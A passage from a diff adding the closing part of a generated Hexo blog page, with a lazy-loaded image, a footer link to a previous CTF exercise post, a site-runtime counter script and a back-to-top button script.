+       src="/images/posts/Pasted%20image%2020260908143425.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div></p>
+</div>
+
+      <footer class="post-footer">
+        <div class="post-nav">
+          
+          <div class="post-nav-prev">
+            <i class="fa fa-chevron-left"></i>
+            <a href="/2026/09/27/FSOP-buu-houseoforange/" rel="prev">
+              FSOP例题 buu houseoforange
+            </a>
+          </div>
+           
+        </div>
+      </footer>
+    </article>
+  </main>
+
+  <nav class="pagination">
+  
+  <div class="pagination-placeholder"></div>
+  
+</nav>
+
+</div>
+</div>
+    <footer class="footer-container">
+  <div class="footer-content">
+    <p class="footer-text">
+      © 2026
+      <a href="https://github.com/asukacc" target="_blank">shaw</a>.
+      All Rights Reserved.
+    </p>
+    <p class="footer-text">
+      Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by 
+      <a href="https://github.com/asukacc/YoruKumo" target="_blank">YoruKumo</a>
+    </p>
+    <p class="footer-text">
+      <span>本站已运行</span>
+      <span id="runtime" class="runtime-badge"></span>
+    </p>
+  </div>
+</footer>
+
+<script>
+  function calculateRuntime() {
+    // 网站开始运行的时间，格式：年-月-日
+    const startTime = new Date('Wed Jan 01 2025 00:00:00 GMT+0000 (Coordinated Universal Time)');
+    const currentTime = new Date();
+
+    const timeDiff = currentTime - startTime;
+    const days = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
+    const hours = Math.floor(
+      (timeDiff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
+    );
+    const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
+
+    const dayStr = ' 天 ';
+    const hourStr = ' 小时 ';
+    const minuteStr = ' 分 ';
+    const secondStr = ' 秒';
+
+    document.getElementById(
+      'runtime'
+    ).innerHTML = `${days}${dayStr}${hours}${hourStr}${minutes}${minuteStr}${seconds}${secondStr}`;
+  }
+
+  // 初始运行
+  calculateRuntime();
+  // 每秒更新一次
+  setInterval(calculateRuntime, 1000);
+</script>
+
+
+    <div class="to-top">
+  <svg class="icon" aria-hidden="true">
+    <use xlink:href="#icon-arrowup"></use>
+  </svg>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const toTop = document.querySelector('.to-top');
+    if (!toTop) return;
+
+    const hasGsap = typeof gsap !== 'undefined';
+
+    if (hasGsap) {
+      // 初始隐藏状态
+      gsap.set(toTop, { opacity: 0, scale: 0.6, display: 'none' });
+      
+      let isVisible = false;
+
+      window.addEventListener('scroll', function () {
+        const shouldShow = window.scrollY > window.innerHeight;
+        
+        if (shouldShow && !isVisible) {
+          isVisible = true;
+          gsap.killTweensOf(toTop);
+          gsap.set(toTop, { display: 'flex' });
+          gsap.to(toTop, {
+            opacity: 1,
+            scale: 1,
+            duration: 0.4,
+            ease: 'back.out(1.7)'
+          });
+        } else if (!shouldShow && isVisible) {
+          isVisible = false;
+          gsap.killTweensOf(toTop);
+          gsap.to(toTop, {
+            opacity: 0,
+            scale: 0.6,
+            duration: 0.3,
+            ease: 'power2.in',
+            onComplete: () => {
+              if (!isVisible) gsap.set(toTop, { display: 'none' });
+            }
+          });
+        }
+      });
+
+      // Hover 交互与磁性效果在 animation.js 中全局托管
+    } else {
+      // 优雅降级：传统滚动监听
+      window.addEventListener('scroll', function () {
+        if (window.scrollY > window.innerHeight) {
+          toTop.style.display = 'flex';
+        } else {
+          toTop.style.display = 'none';
+        }
+      });
+    }
+
+    // 点击事件
+    toTop.addEventListener('click', function () {
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth',
+      });
+    });
+  });
+</script>
+
+    
+<script src="/js/animation.js"></script>
+<script src="/js/highlight.js"></script>
+<script src="/js/image-viewer.js"></script>
+
+  </body>
+</html>
